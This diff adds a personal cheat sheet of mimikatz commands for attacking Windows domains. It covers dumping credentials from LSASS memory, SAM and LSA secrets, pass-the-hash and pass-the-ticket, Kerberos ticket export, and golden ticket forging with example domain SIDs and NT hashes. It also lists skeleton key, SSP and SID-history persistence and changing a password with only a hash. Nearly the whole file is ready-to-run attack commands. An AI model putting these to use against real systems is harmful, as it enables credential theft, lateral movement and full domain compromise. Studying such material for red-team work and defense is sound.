@@ -1,0 +1,120 @@
+# mimikatz
+
+http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/
+http://adsecurity.org/?p=556 https://adsecurity.org/?page_id=1821
+https://github.com/gentilkiwi/mimikatz/wiki
+
+# always (to access secure lsa mem)
+privilege::debug
+
+# lulz
+coffee
+markruss
+minesweeper::infos
+
+# who am i
+system::user
+
+# minidump
+mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
+
+# list module commands
+sekurlsa::asdf
+
+# logged-on users
+sekurlsa::logonPasswords
+
+# outband SMB sessions
+sekurlsa::ssp
+
+# sam hashes
+samdump::hashes
+
+# get system
+token::elevate
+
+# lsa secrets and cached creds
+lsadump::secrets system.save security.save
+lsadump::cache system.save security.save
+
+# vault
+vault::list
+vault::cred
+
+# scheduled tasks with credz
+?
+
+# kiwissp.dll
+Security Providers
+will dump passwords in clear-text of users logging-on console or RDP
+
+# pass the ticket (aka overpass-the-hash)
+sekurlsa::pth /user:Administrator /domain:LAB.lOCAL /rc4:6194bd1a5bf3ecd542e8aac9860bddf0
+or with /aes256: instead of rc4 or etc.
+
+# pass the hash to RDP to host using restricted admin mode
+sekurlsa::pth /user: /domain:bar /ntlm:... /run:"mstsc /restrictedadmin /v:1.2.3.4"
+
+# kerberos tickets
+sekurlsa::ekeys # dump all keys in mem
+sekurlsa::tickets /export # export tickets of everyone if SYSTEM
+kerberos::klist
+kerberos::ptt blah.tgt blih.tgs # import tgt or tgs
+kerberos::ptt tickets # list
+
+# golden ticket (tgt 10years hardcoded)
+# http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos
+# http://rycon.hu/papers/goldenticket.html
+- krbtgt user's NT hash (e.g. from a previous NTDS.DIT dump)
+- Domain name
+- Domain's SID (S-1-5-21-1723555596-1415287819-2705645101)
+- Username that we'd like to impersonate
+
+PsGetsid.exe CTU.DOMAIN (or with whoami)
+mimikatz.exe
+ kerberos::list
+ kerberos::purge # not 100% reliable but loggoff is
+ kerberos::golden /admin:Administrator /domain:domain.local /sid:S-1-5-21-1723555596-1415287819-2705645101 /krbtgt:6194bd1a5bf3ecd542e8aac9860bddf0 /ticket:domain.local.kirbi
+ kerberos::golden /domain:domain.local /sid:S-1-5-21-1723555596-1415287819-2705645101 /rc4:6194bd1a5bf3ecd542e8aac9860bddf0 /user:Administrator /id:500 /groups:513,512,520,518,519 /ptt *or* /ticket:domain.local.kirbi and then kerberos:ptt domain.local.kirbi
+ kerberos::list
+ kerberos::tgt # list tgt only
+
+512: domain admins
+519: enterprise admins
+518: schema admins
+520:
+513:
+ 
+additional notes:
+- Password change on behalf of the user does not have any impact on the ticket, the access can be granted without the user's password or hash
+- Existing sessions cannot be overridden. Already attached shares have to be detached first and reattached again.
+- Cached tickets sometimes cannot be purged so the computer has to be restarted (for example if there is a group policy that attaches different shares then those shares cannot be mounted as the impersonated user)
+- Mimikatz does not require SE_DEBUG or other privilege to create and pass TGT
+
+# silver ticket (TGS)
+https://adsecurity.org/?p=2011
+
+# mass mimikatz and null session share setup howto
+https://blog.netspi.com/auto-dumping-domain-credentials-using-spns-powershell-remoting-and-mimikatz/
+http://www.room362.com/blog/2013/10/06/dumping-a-domain-worth-of-passwords-with-mimikatz/ 
+
+# virtual machine memory (eg from a .vmem)
+http://carnal0wnage.attackresearch.com/2014/06/mimikatz-against-virtual-machine-memory.html
+
+# change user password with only the nt hash
+aoratopw.exe /user:jsmith /domain:chocolate.local /key:asjdfasdfasdf /new:Kikoolol1
+
+# beyond
+misc::addsid # sid history
+
+mimilib Password Filter
+mimilib SSP # requires reboot
+
+misc::memssp # to try out
+
+misc::skeleton
+
+# windows 8.1
+http://carnal0wnage.attackresearch.com/2015/02/msfs-mimikatz-doesnt-work-on-windows-81.html?utm_content=buffer1ac94&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer
+https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
+http://www.labofapenetrationtester.com/2015/05/dumping-passwords-in-plain-on-windows-8-1.html
